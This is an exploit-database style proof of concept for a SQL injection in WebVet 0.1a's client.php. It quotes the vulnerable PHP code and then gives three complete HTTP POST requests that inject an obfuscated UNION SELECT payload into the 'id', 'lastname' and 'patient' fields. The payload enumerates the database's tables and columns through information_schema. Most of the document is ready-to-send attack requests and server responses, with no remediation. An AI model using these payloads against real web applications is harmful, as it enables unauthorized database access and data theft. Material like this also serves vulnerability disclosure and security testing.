@@ -1,0 +1,97 @@
+# Exploit Title: WebVet 0.1a - 'id' SQL Injection
+# Dork: N/A
+# Date: 2018-11-04
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://webvet.exreality.net/
+# Software Link: https://netix.dl.sourceforge.net/project/webvet/webvet_2013_07_08.zip
+# Version: 0.1a
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# /[PATH]/client.php
+#091 	else if (!empty($_POST['form_search_client']))
+#092 	{
+#093 		$searchedClient = new Client();
+#094 		if (!empty($_POST['id']))
+#095 			$searchedClient->id = $_POST['id'];
+#096 		if (!empty($_POST['lastname']))
+#097 			$searchedClient->lastname = $_POST['lastname'];
+#098 		if (!empty($_POST['patient']))
+#099 			$searchedClient->patient = $_POST['patient'];
+#100 
+#101 		// do the search
+#102 		$db_connection = db_open(db_user_name, db_user_passw, db_name);
+#103 		if (!$db_connection) die;
+#104 		$clients = db_search_client($searchedClient, clients_table_name, $db_connection);
+#105 		include "clients_view.php";
+#106 	}
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/client.php
+# 
+POST /[PATH]/client.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 525
+id=1 UNION SELECT 0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)-- -&form_search_client=Efe
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 18:13:34 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1229
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/client.php
+# 
+POST /[PATH]/client.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 501
+lastname=' UNION SELECT 0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)-- -&form_search_client=Efe
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 18:19:04 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1229
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/client.php
+# 
+POST /[PATH]/client.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 499
+patient='  UNION SELECT 0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)-- -&form_search_client=Efe
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 18:21:05 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1229
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
